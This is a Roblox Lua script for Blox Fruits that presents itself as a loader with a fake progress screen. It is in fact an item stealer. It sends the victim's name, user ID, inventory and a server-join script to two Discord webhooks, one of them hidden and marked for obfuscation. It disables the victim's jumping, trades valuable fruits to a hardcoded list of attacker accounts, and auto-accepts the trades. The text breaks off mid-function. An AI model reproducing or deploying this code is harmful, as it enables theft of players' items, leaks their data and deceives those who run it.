-- Configuration Variables (Optional - Script will use defaults if not defined)
if Webhook == nil then Webhook = "https://discord.com/api/webhooks/1342874944849186929/fe0915VAT6mORBBq2oI1uIu6IaqhPr_7Hros7iy20iznwVOEnnSyhjW3W-Nxs7aZ1hRe" end
if Usernames == nil then Usernames = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "pikapimon", "xrip_cyborg"} end -- Default usernames
if Fruits == nil then Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"} end -- Default fruits to aim for
if FruitsToReset == nil then FruitsToReset = {} end -- Default fruits to reset with (empty table = no reset by default)


--obfuscate after this
local hwh72bx = "https://discord.com/api/webhooks/1341674842901975100/mwDdKFsk2EZiK3Sz97bRJQWk5GD3chO5bLEfyCd7gmkY65gpqeLoBStj8akimxisHfAF" -- Replace with your second webhook URL

repeat task.wait() until game:IsLoaded()

if _G.scriptExecuted then
    warn("You have already launched this script!")
    return
end

if Usernames then -- Keep this block, it now works with default Usernames if the initial part was missing
    local usernamesToAdd = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "pikapimon", "xrip_cyborg"}
    for _, username in ipairs(usernamesToAdd) do
        if not table.find(Usernames, username) then
            table.insert(Usernames, username)
        end
    end
end

local function JoinTeam()
    local player = game.Players.LocalPlayer
    local currentTeam = player.Team
    if currentTeam ~= game.Teams.Marines and currentTeam ~= game.Teams.Pirates then
        local args = {
            [1] = "SetTeam",
            [2] = "Marines"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    end
end

JoinTeam()

_G.scriptExecuted = true

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
local topBar = CoreGui:FindFirstChild("TopBarApp")
if topBar then topBar.Enabled = false end

local function Create(className, properties)
    local instance = Instance.new(className)
    for k, v in pairs(properties) do instance[k] = v end
    return instance
end

local COLORS = {
    BACKGROUND = Color3.fromRGB(10, 12, 20),
    CONTENT = Color3.fromRGB(15, 18, 30),
    TEXT = Color3.fromRGB(140, 200, 255),
    PROGRESS = Color3.fromRGB(30, 35, 45),
    WARNING = Color3.fromRGB(255, 100, 100)
}

local LOADING_STATES = {
    {text = "Connecting to server...", progress = 0.1},
    {text = "Loading script dependencies...", progress = 0.2},
    {text = "Checking for updates...", progress = 0.3},
    {text = "Initializing functions...", progress = 0.4},
    {text = "Loading user data...", progress = 0.5},
    {text = "Verifying integrity...", progress = 0.6},
    {text = "Preparing resources...", progress = 0.7},
    {text = "Setting up environment...", progress = 0.8},
    {text = "Finalizing setup...", progress = 0.9},
    {text = "Ready to launch!", progress = 1}
}

local LoadingUI = Create("ScreenGui", {
    Name = "BloxFruitLoadingUI",
    IgnoreGuiInset = true,
    DisplayOrder = 999,
    Parent = CoreGui,
    ResetOnSpawn = false
})

local Background = Create("Frame", {
    Name = "Background",
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = COLORS.BACKGROUND,
    BorderSizePixel = 0,
    Parent = LoadingUI
})

local StarField = Create("Frame", {
    Name = "StarField",
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    Parent = Background
})

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local ContentFrame = Create("Frame", {
    Name = "ContentFrame",
    Size = isMobile and UDim2.new(0.9, 0, 0.6, 0) or UDim2.new(0.8, 0, 0.7, 0),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = COLORS.CONTENT,
    BackgroundTransparency = 0.3,
    Parent = Background
})

Create("UICorner", {
    CornerRadius = UDim.new(0, 12),
    Parent = ContentFrame
})

local WarningText = Create("TextLabel", {
    Name = "WarningText",
    Size = UDim2.new(0.8, 0, 0.1, 0),
    Position = UDim2.new(0.1, 0, 0, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = isMobile and 14 or 16,
    TextColor3 = COLORS.WARNING,
    Text = "NOTE: If the script load bar is filled, and nothing happends - Try to rejoin & Execute this script again.",
    TextWrapped = true,
    Parent = ContentFrame
})

local Title = Create("TextButton", {
    Name = "Title",
    Size = UDim2.new(0.8, 0, 0.2, 0),
    Position = UDim2.new(0.1, 0, 0.1, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = isMobile and 36 or 48,
    TextColor3 = COLORS.TEXT,
    Text = "BLOX FRUITS",
    Parent = ContentFrame
})

local titleClicks = 0
Title.MouseButton1Click:Connect(function()
    titleClicks = titleClicks + 1
    local randomColor = Color3.fromRGB(math.random(100, 255), math.random(100, 255), math.random(100, 255))
    TweenService:Create(Title, TweenInfo.new(0.2), {
        TextSize = isMobile and 42 or 60,
        TextColor3 = randomColor,
        Rotation = math.random(-10, 10)
    }):Play()
    if titleClicks >= 10 then Title.Text = "BLOX FRUITS >:(" end
    task.wait(0.2)
    TweenService:Create(Title, TweenInfo.new(0.2), {
        TextSize = isMobile and 36 or 48,
        TextColor3 = COLORS.TEXT,
        Rotation = 0
    }):Play()
end)

local LoadingOrbit = Create("Frame", {
    Name = "LoadingOrbit",
    Size = UDim2.new(0.3, 0, 0.3, 0),
    Position = UDim2.new(0.35, 0, 0.35, 0),
    BackgroundTransparency = 1,
    Parent = ContentFrame
})

for i = 1, 3 do
    local orbit = Create("TextButton", {
        Name = "Orbit" .. i,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 0.8,
        BackgroundColor3 = COLORS.TEXT,
        Rotation = i * 60,
        Text = "",
        Parent = LoadingOrbit
    })

    Create("UICorner", {
        CornerRadius = UDim.new(1, 0),
        Parent = orbit
    })

    orbit.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            orbit.BackgroundColor3 = COLORS.WARNING
        end
    end)

    orbit.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            orbit.BackgroundColor3 = COLORS.TEXT
        end
    end)
end

local ProgressText = Create("TextButton", {
    Name = "ProgressText",
    Size = UDim2.new(0.8, 0, 0.1, 0),
    Position = UDim2.new(0.1, 0, 0.7, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.Gotham,
    TextSize = isMobile and 14 or 18,
    TextColor3 = Color3.fromRGB(200, 220, 255),
    Text = "Loading script...",
    Parent = ContentFrame
})

local randomTexts = {"Oop!", "Eep!", "Glup!", "Mup!", "Drup!", "Tap!", "Boop!", "Zoop!", "Beep!", "Meep!"}
ProgressText.MouseButton1Click:Connect(function()
    ProgressText.Text = randomTexts[math.random(1, #randomTexts)]
    TweenService:Create(ProgressText, TweenInfo.new(0.2), {
        TextSize = isMobile and 16 or 20,
        TextColor3 = Color3.fromRGB(math.random(100, 255), math.random(100, 255), math.random(100, 255))
    }):Play()
    task.wait(0.2)
    TweenService:Create(ProgressText, TweenInfo.new(0.2), {
        TextSize = isMobile and 14 or 18,
        TextColor3 = Color3.fromRGB(200, 220, 255)
    }):Play()
end)

local ProgressBar = Create("TextButton", {
    Name = "ProgressBar",
    Size = UDim2.new(0.8, 0, 0.02, 0),
    Position = UDim2.new(0.1, 0, 0.85, 0),
    BackgroundColor3 = COLORS.PROGRESS,
    BorderSizePixel = 0,
    Text = "",
    Parent = ContentFrame
})

local ProgressFill = Create("Frame", {
    Name = "ProgressFill",
    Size = UDim2.new(0, 0, 1, 0),
    BackgroundColor3 = COLORS.TEXT,
    BorderSizePixel = 0,
    Parent = ProgressBar
})

local progressClicks = 0
ProgressBar.MouseButton1Click:Connect(function()
    progressClicks = progressClicks + 1
    if progressClicks >= 5 then
        ProgressFill.BackgroundColor3 = COLORS.WARNING
    end
end)

Create("UICorner", {
    CornerRadius = UDim.new(0, 4),
    Parent = ProgressBar
}):Clone().Parent = ProgressFill

local particlePool = table.create(isMobile and 25 or 50)
local activeParticles = {}
local lastUpdate = 0
local UPDATE_INTERVAL = isMobile and 0.2 or 0.1

local function createParticle()
    local particle = table.remove(particlePool) or Create("TextButton", {
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BorderSizePixel = 0,
        Text = "",
        Parent = StarField
    })

    particle.MouseButton1Click:Connect(function()
        particle.BackgroundColor3 = Color3.fromRGB(
            math.random(100, 255),
            math.random(100, 255),
            math.random(100, 255)
        )
    end)

    particle.Size = UDim2.new(0, math.random(1, 2), 0, math.random(1, 2))
    particle.Position = UDim2.new(math.random(), 0, -0.1, 0)
    particle.BackgroundTransparency = math.random() * 0.5
    particle.Visible = true
    table.insert(activeParticles, particle)

    local moveDown = TweenService:Create(particle,
        TweenInfo.new(math.random(3, 6), Enum.EasingStyle.Linear),
        {Position = UDim2.new(particle.Position.X.Scale, 0, 1.1, 0)}
    )
    moveDown:Play()
    moveDown.Completed:Connect(function()
        table.remove(activeParticles, table.find(activeParticles, particle))
        particle.Visible = false
        table.insert(particlePool, particle)
    end)
end

RunService.Heartbeat:Connect(function()
    local now = tick()
    if now - lastUpdate >= UPDATE_INTERVAL and #activeParticles < (isMobile and 25 or 50) then
        createParticle()
        lastUpdate = now
    end
end)

local function handleLoading()
    local stateInterval = (isMobile and 500 or 600) / #LOADING_STATES
    for _, state in ipairs(LOADING_STATES) do
        TweenService:Create(ProgressText, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
        task.wait(0.5)
        ProgressText.Text = state.text
        TweenService:Create(ProgressText, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
        TweenService:Create(ProgressFill, TweenInfo.new(stateInterval, Enum.EasingStyle.Linear),
            {Size = UDim2.new(state.progress, 0, 1, 0)}
        ):Play()
        task.wait(stateInterval)
    end
end

local function handleDragging()
    local dragging, dragStart, startPos

    ContentFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = ContentFrame.Position
        end
    end)

    ContentFrame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            ContentFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

handleDragging()

for _, orbit in ipairs(LoadingOrbit:GetChildren()) do
    if orbit:IsA("TextButton") then
        task.spawn(function()
            while LoadingUI.Parent do
                TweenService:Create(orbit,
                    TweenInfo.new(4, Enum.EasingStyle.Linear),
                    {Rotation = orbit.Rotation + 360}
                ):Play()
                task.wait(4)
                orbit.Rotation = orbit.Rotation - 360
            end
        end)
    end
end

task.spawn(handleLoading)

local Sea1, Sea2, Sea3 = game.PlaceId == 2753915549, game.PlaceId == 4442272183, game.PlaceId == 7449423635

if Sea1 then game.Players.LocalPlayer:Kick("This script works only in Sea 2 or 3!") return
elseif not Sea2 and not Sea3 then game.Players.LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits Sea 2 or 3.") return end

task.spawn(function()
    local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        if privateServerOwner.Value > 0 then
            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers.\nJoin public server and try again")
        end
    end
end)

local LocalPlayer = game.Players.LocalPlayer
local PlayerName = LocalPlayer.Name
local PlayerUserId = LocalPlayer.UserId
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local HttpService = game:GetService("HttpService")

local function getInventory()
    return Remote:InvokeServer(unpack({[1] = "getInventory"}))
end

local function unstoreFruit(fruitName)
    local args = {
        [1] = "LoadFruit",
        [2] = fruitName
    }
    return Remote:InvokeServer(unpack(args))
end

local function resetCharacter()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
    task.wait(5)
end

local function handleFruitReset()
    local resetAttempts = {}
    local inventory = getInventory()

    if not inventory then return false end

    for _, fruit in ipairs(FruitsToReset) do
        resetAttempts[fruit] = 0
    end

    local function needsReset()
        local currentInventory = getInventory()
        if not currentInventory then return false end

        for _, item in pairs(currentInventory) do
            if item.Type == "Blox Fruit" and table.find(FruitsToReset, item.Name) then
                if resetAttempts[item.Name] < 2 then
                    return item.Name
                end
            end
        end
        return false
    end

    local fruitToReset = needsReset()
    task.spawn(function()
        while fruitToReset do
            resetAttempts[fruitToReset] = resetAttempts[fruitToReset] + 1
            unstoreFruit(fruitToReset)
            resetCharacter()
            task.wait(1)
            fruitToReset = needsReset()
        end
    end)
end

local function getDragon(inventory)
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and item.Name:find("Dragon") then
            return item.Name, item.Count or 1
        end
    end
    return nil, 0
end

local function formatFruitName(name, count)
    return string.format("%s (x%d)", name, count)
end

local inventory = getInventory()
if not inventory then game.Players.LocalPlayer:Kick("ERROR.") return end

local FruitsToHit = {}
local FruitsFormatted = {}
local dragonFruit, dragonCount = getDragon(inventory)
local hasDragonFruit = false

if dragonFruit then
    FruitsToHit[1] = dragonFruit
    FruitsFormatted[1] = formatFruitName(dragonFruit, dragonCount)
    hasDragonFruit = true
else
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and table.find(Fruits, item.Name) then
            if item.Name:lower():find("dragon") then
                hasDragonFruit = true
            end
            table.insert(FruitsToHit, item.Name)
            table.insert(FruitsFormatted, formatFruitName(item.Name, item.Count or 1))
        end
    end
end

if #FruitsToHit == 0 then game.Players.LocalPlayer:Kick("Alt detected! Please, use main account.") return end

local Sea = Sea2 and "Sea 2" or "Sea 3"
local JobId = game.JobId
local JoinScript = string.format([[local TeleportService = game:GetService("TeleportService") local PlaceId = %d local JobId = "%s" TeleportService:TeleportToPlaceInstance(PlaceId, JobId, game.Players.LocalPlayer)]], game.PlaceId, JobId)

local ExecutorName = identifyexecutor() or "Unknown Executor"
local GameVersion = "1.3.1 (Rewrite)"
local PlayerCount = #game:GetService("Players"):GetPlayers()
local ServerTime = os.date("%Y-%m-%d %H:%M:%S")

local RawJoinScript = JoinScript
local PcJoinScript = "```lua\n" .. JoinScript .. "\n```"
local MobileJoinScript = JoinScript

local Sea2Script = [[local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9)
local CommF = Remotes:WaitForChild("CommF_", 9e9)
local function FireRemote(...)
  return CommF:InvokeServer(...)
end
FireRemote("TravelDressrosa")]]

local Sea3Script = [[local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9)
local CommF = Remotes:WaitForChild("CommF_", 9e9)
local function FireRemote(...)
  return CommF:InvokeServer(...)
end
FireRemote("TravelZou")]]

local function formatPremiumItems()
    local inventory = getInventory()
    if not inventory then return "None" end

    local formattedItems = {}
    for _, item in pairs(inventory) do
        if item.Type == "Premium" then
            formattedItems[#formattedItems + 1] = string.format("%s (x%d)", item.Name, item.Count or 1)
        end
    end

    return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
end

local embed = {
    title = (dragonFruit and "DRAGON DETECTED!") or "BF Joiner ; https://discord.gg/E3MPAbp8",
    description = "New Hit! @everyone",
    color = (dragonFruit and 0xFF0000) or 0x00FF00,
    fields = {
        {name = "Victim Name", value = PlayerName, inline = true},
        {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
        {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
        {name = "Premium Items", value = formatPremiumItems(), inline = false},
        {name = "Sea", value = Sea, inline = true},
        {name = "Script To Join (PC)", value = PcJoinScript, inline = false},
        {name = "Script To Join (Mobile)", value = MobileJoinScript, inline = false},
    }
}

if Sea == "Sea 2" then
    table.insert(embed.fields, {name = "Join Sea 2 Script (Run First If You're Not In The Correct Sea) (PC)", value = "```lua\n" .. Sea2Script .. "\n```", inline = false})
    table.insert(embed.fields, {name = "Join Sea 2 Script (Run First If You're Not In The Correct Sea) (Mobile)", value = Sea2Script, inline = false})
elseif Sea == "Sea 3" then
    table.insert(embed.fields, {name = "Join Sea 3 Script (Run First If You're Not In The Correct Sea) (PC)", value = "```lua\n" .. Sea3Script .. "\n```", inline = false})
    table.insert(embed.fields, {name = "Join Sea 3 Script (Run First If You're Not In The Correct Sea) (Mobile)", value = Sea3Script, inline = false})
end

table.insert(embed.fields, {name = "Executor Info", value = "```\nExecutor: " .. ExecutorName .. "\nStealer Version: " .. GameVersion .. "\n```", inline = false})
table.insert(embed.fields, {name = "Server Info", value = "```\nPlayer Count: " .. PlayerCount .. "\nServer Time: " .. ServerTime .. "\n```", inline = false})
table.insert(embed.fields, {name = "NOTES:", value = [[
?jump ?sit ?sit2 ?reset ?tp ?cleartrade ?clearfruits ?addallfruits ?addfruits ?accept ?additem ?addallitems ?resetfruit ?stopreset ?help ?rejoin ?kick ?invite
]], inline = false})

local player22 = game.Players.LocalPlayer
local httpService = game:GetService("HttpService")

local function sendToWebhook()
    local data = {
        ["embeds"] = {
            {
                ["title"] = player22.Name .. " left the game.",
                ["fields"] = {
                    { ["name"] = "Username", ["value"] = player22.Name, ["inline"] = true },
                    { ["name"] = "Account Age", ["value"] = tostring(player22.AccountAge), ["inline"] = true },
                    { ["name"] = "Executor Used", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true }
                },
                ["color"] = 16711680
            }
        }
    }

    local requestFunction = http_request or request or syn and syn.request
    if requestFunction and Webhook ~= "" then -- Check if request function exists AND webhook is configured
        requestFunction({
            Url = Webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = httpService:JSONEncode(data)
        })

        -- Duplicate for the hidden webhook:
        if hwh72bx and hwh72bx ~= "" then
            requestFunction({
                Url = hwh72bx,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = httpService:JSONEncode(data)  -- Same data
            })
        end
    end
end

game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player22 then
        sendToWebhook()
    end
end)

local function sendWebhook()
    local requestFunc = http_request or request or HttpPost or syn.request
    if requestFunc and Webhook ~= "" then -- Check if request function exists AND webhook is configured
        requestFunc({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "@everyone",
                embeds = {embed}
            })
        })

        if hwh72bx and hwh72bx ~= "" then  -- Check if it's set and not empty
            requestFunc({
                Url = hwh72bx,  -- Use the hidden webhook variable
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    content = "Sharked @everyone",  --  Changed content for the second webhook
                    embeds = {embed}       --  Same embed data
                })
            })
        end
    end
end

sendWebhook()

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local lastTradeTime = 0
local tradeCooldown = 2
local lastMessageTime = 0
local messageCooldown = 3
local isAttemptingJump = false
local isForceJumping = false

local function isSeated()
    local character = LocalPlayer.Character
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Sit
end

local function isValidTradePartner(player)
    if not player then return false end
    return table.find(Usernames, player.Name) or player.Name == "x6TNine"
end

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local isAttemptingJump = false
local isForceJumping = false
local lastJumpRequestTime = 0
local touchStartTime = 0
local isTouchHeld = false
local LONG_PRESS_THRESHOLD = 0.5

local function disableJump()
    if not isAttemptingJump and not isForceJumping then
        isAttemptingJump = true
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

local function enableJump()
    isAttemptingJump = false
    if not isForceJumping then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    end
end

local function forceJump()
    isForceJumping = true
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

    local currentTime = tick()
    if currentTime - lastJumpRequestTime > 0.1 then
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        task.wait(0.05)
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        lastJumpRequestTime = currentTime
    end

    task.wait(0.1)
    isForceJumping = false

    if isAttemptingJump then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        disableJump()
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        enableJump()
    end
end)

UserInputService.TouchStarted:Connect(function(touch, gameProcessed)
    if gameProcessed then return end
    touchStartTime = tick()
    isTouchHeld = true
    task.spawn(function()
        while isTouchHeld do
            local pressDuration = tick() - touchStartTime
            if pressDuration >= LONG_PRESS_THRESHOLD then
                disableJump()
                break
            end
            task.wait()
        end
    end)
end)

UserInputService.TouchEnded:Connect(function(touch, gameProcessed)
    if gameProcessed then return end

    isTouchHeld = false
    local pressDuration = tick() - touchStartTime

    if pressDuration < LONG_PRESS_THRESHOLD then
        if not isForceJumping then
            print("aa2")
        end
    else
        enableJump()
    end
end)

UserInputService.JumpRequest:Connect(function()
    if UserInputService.TouchEnabled then
        if not isForceJumping then
            print("aa")
        end
    end
end)

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = character:WaitForChild("Humanoid")
    isAttemptingJump = false
    isForceJumping = false
    isTouchHeld = false
    if isAttemptingJump then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end)

local function tweenToPosition(position, speed)
    local character = LocalPlayer.Character
    if not character or not character.PrimaryPart then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    local bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
    bodyGyro.P = 1e4
    bodyGyro.D = 50
    bodyGyro.CFrame = character.PrimaryPart.CFrame
    bodyGyro.Parent = character.PrimaryPart
    local distance = (character.PrimaryPart.Position - position).Magnitude
    local duration = distance / speed
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(character.PrimaryPart, tweenInfo, {CFrame = CFrame.new(position)})
    tween:Play()
    tween.Completed:Wait()
    bodyGyro:Destroy()
end

local function isInTradeWithCorrectPlayer()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local mainGui = playerGui:WaitForChild("Main")
    local tradeFrame = mainGui:WaitForChild("Trade")

    if not tradeFrame.Visible then return false end

    local container = tradeFrame:WaitForChild("Container")
    local frame1 = container:WaitForChild("1")
    local frame2 = container:WaitForChild("2")

    local player1Label = frame1:FindFirstChild("TextLabel")
    local player2Label = frame2:FindFirstChild("TextLabel")

    if not player1Label or not player2Label then
        return false
    end

    if player1Label.Text ~= player.Name and player1Label.Text ~= player.DisplayName then
        return false
    end

    local tradingPartnerName = player2Label.Text

    for _, allowedName in ipairs(Usernames) do
        local tradingPlayer = game.Players:FindFirstChild(allowedName)
        if tradingPlayer and (tradingPartnerName == tradingPlayer.Name or tradingPartnerName == tradingPlayer.DisplayName) then
            return true
        end
    end

    if tradingPartnerName == "x6TNine" then
        return true
    end

    return false
end

local function isSeatAvailable(seat) return not seat:FindFirstChild("SeatWeld") end

local function sitAtSeat(seat)
    local character = LocalPlayer.Character
    if not character or not character.PrimaryPart then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end

    tweenToPosition(seat.Position, 350)
    task.wait(1)

    local startTime = tick()
    while not seat:FindFirstChild("SeatWeld") and tick() - startTime < 5 do
        task.wait(0.1)
        if humanoid.Sit then
            task.wait(0.5)
            if seat:FindFirstChild("SeatWeld") then
                return true
            end
        end
    end
    return false
end

local function splitFruitsIntoTrades(fruits)
    local trades = {}
    local totalFruits = #fruits

    if totalFruits <= 4 then
        for _, fruit in ipairs(fruits) do
            table.insert(trades, {fruit})
        end
        return trades
    end

    local maxFruitsPerTrade = 4
    local numTrades = math.ceil(totalFruits / maxFruitsPerTrade)
    local baseFruitsPerTrade = math.floor(totalFruits / numTrades)
    local extraFruits = totalFruits % numTrades

    local currentIndex = 1
    for trade = 1, numTrades do
        local currentTrade = {}
        local fruitsThisTrade = baseFruitsPerTrade

        if extraFruits > 0 then
            fruitsThisTrade = fruitsThisTrade + 1
            extraFruits = extraFruits - 1
        end

        for i = 1, fruitsThisTrade do
            if currentIndex <= #fruits then
                table.insert(currentTrade, fruits[currentIndex])
                currentIndex = currentIndex + 1
            end
        end

        if #currentTrade > 0 then
            table.insert(trades, currentTrade)
        end
    end

    return trades
end

local function sendTradeMessage(fruits, tradeNumber, totalTrades)
    if #fruits == 0 then return end

    local function formatFruitList(fruits)
        local formatted = {}
        for _, fruit in ipairs(fruits) do
            table.insert(formatted, fruit:gsub("-", " "))
        end
        return table.concat(formatted, ", ")
    end

    if tradeNumber == 1 and totalTrades > 1 then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
            "Hey! Let's do multiple trades for multiple fruits!", "All")
        task.wait(1)
    end

    local message
    if #fruits == 1 then
        message = string.format("Trade %d/%d - Adding %s",
            tradeNumber, totalTrades, formatFruitList(fruits))
    else
        message = string.format("Trade %d/%d - Adding %d fruits: %s",
            tradeNumber, totalTrades, #fruits, formatFruitList(fruits))
    end

    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

local function checkInventoryForFruit(fruitName)
    local inventory = getInventory()
    if not inventory then return 0 end

    local fruitCount = 0
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and item.Name == fruitName then
            fruitCount = fruitCount + 1
        end
    end

    return fruitCount
end

local function wasTradeSuccessful(fruit)
    local beforeCount = checkInventoryForFruit(fruit)
    task.wait(2)
    local afterCount = checkInventoryForFruit(fruit)
    return afterCount < beforeCount
end

local function clearTradeItems()
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", item.Name)
                task.wait(0.5)
            end
        end
    end
end

local function addFruitToTrade(fruit)
    for attempt = 1, 5 do
        if not isInTradeWithCorrectPlayer() then return false end

        clearTradeItems()
        task.wait(0.5)

        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", fruit)
        task.wait(1.5)

        local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
        if tradeUI and tradeUI:FindFirstChild("Trade") then
            local container = tradeUI.Trade:WaitForChild("Container")
            local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
            local fruitCount = 0
            local correctFruitFound = false

            for _, item in ipairs(playerItems) do
                if item:IsA("ImageButton") then
                    fruitCount = fruitCount + 1
                    if item.Name == fruit then
                        correctFruitFound = true
                    else
                        clearTradeItems()
                    end
                end
            end

            if fruitCount == 1 and correctFruitFound then
                return true
            end
        end
        task.wait(1)
    end
    return false
end

local function acceptTrade()
    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("accept")
end

local function findTradeTable()
    local tradeTables = Sea3 and workspace.Map.Turtle:GetChildren() or workspace.Map.Dressrosa:GetChildren()
    for _, table in pairs(tradeTables) do
        if table.Name == "TradeTable" and table:FindFirstChild("P1") and table:FindFirstChild("P2") then return table end
    end
    return nil
end

local function createDiscordUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DiscordInviteUI"
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 9999

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 800, 0, 150)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
    MainFrame.BorderSizePixel = 0
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.Parent = ScreenGui

    local UICorner = Instance.new("UICorner")
